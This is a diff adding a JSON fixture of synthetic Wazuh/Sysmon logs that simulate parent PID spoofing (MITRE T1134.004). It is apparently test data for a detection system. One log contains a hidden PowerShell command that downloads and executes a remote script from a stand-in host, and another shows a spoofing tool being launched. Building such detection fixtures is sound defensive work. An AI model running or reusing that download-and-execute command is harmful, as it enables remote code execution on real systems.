@@ -1,0 +1,173 @@
+{
+  "_metadata": {
+    "attack_id": "T1134.004",
+    "variation": "001",
+    "name": "Parent PID Spoofing - Explorer as Parent",
+    "description": "PowerShell spawned with Explorer.exe as spoofed parent to evade detection",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "defense-evasion",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - PowerShell with unusual parent (explorer.exe)",
+      "sequence": 1,
+      "timestamp": "2026-01-30T14:30:00.000Z",
+      "log": {
+        "timestamp": "2026-01-30T14:30:00.000+0000",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: Process Creation with suspicious parent",
+          "id": "100001",
+          "mitre": {
+            "id": [
+              "T1134.004"
+            ],
+            "tactic": [
+              "Defense Evasion"
+            ],
+            "technique": [
+              "Parent PID Spoofing"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1706621400.134001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1134.004",
+        "_fomorian_batch": "8",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION",
+              "systemTime": "2026-01-30T14:30:00.000000000Z"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-30 14:30:00.000",
+              "processGuid": "{A1B2C3D4-PPID-0001-0001-000000000001}",
+              "processId": "7892",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.50/payload.ps1')\"",
+              "currentDirectory": "C:\\Users\\jsmith\\",
+              "user": "CORP\\jsmith",
+              "logonGuid": "{A1B2C3D4-1234-5678-9ABC-DEF000000001}",
+              "logonId": "0x3E7",
+              "terminalSessionId": "1",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=9A12B34C56D78E90F12AB34CD56EF78901234567890ABCDEF1234567890ABCD",
+              "parentProcessGuid": "{A1B2C3D4-EXPL-0001-0001-000000000001}",
+              "parentProcessId": "1024",
+              "parentImage": "C:\\Windows\\explorer.exe",
+              "parentCommandLine": "C:\\Windows\\Explorer.EXE",
+              "parentUser": "CORP\\jsmith"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - The actual malicious parent that performed spoofing",
+      "sequence": 2,
+      "timestamp": "2026-01-30T14:29:58.000Z",
+      "log": {
+        "timestamp": "2026-01-30T14:29:58.000+0000",
+        "rule": {
+          "level": 10,
+          "description": "Sysmon - Event 1: Process Creation",
+          "id": "100001",
+          "mitre": {
+            "id": [
+              "T1134.004"
+            ],
+            "tactic": [
+              "Defense Evasion"
+            ],
+            "technique": [
+              "Parent PID Spoofing"
+            ]
+          },
+          "firedtimes": 2,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1706621398.134002",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1134.004",
+        "_fomorian_batch": "8",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION",
+              "systemTime": "2026-01-30T14:29:58.000000000Z"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-30 14:29:58.000",
+              "processGuid": "{A1B2C3D4-SPOF-0001-0001-000000000001}",
+              "processId": "6544",
+              "image": "C:\\Users\\jsmith\\Downloads\\ppidspoof.exe",
+              "commandLine": "ppidspoof.exe -ppid 1024 -c powershell.exe -a \"-nop -w hidden -c IEX...\"",
+              "currentDirectory": "C:\\Users\\jsmith\\Downloads\\",
+              "user": "CORP\\jsmith",
+              "logonGuid": "{A1B2C3D4-1234-5678-9ABC-DEF000000001}",
+              "logonId": "0x3E7",
+              "terminalSessionId": "1",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=MALICIOUS1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF12345678",
+              "parentProcessGuid": "{A1B2C3D4-CMD1-0001-0001-000000000001}",
+              "parentProcessId": "5432",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        }
+      }
+    }
+  ]
+}
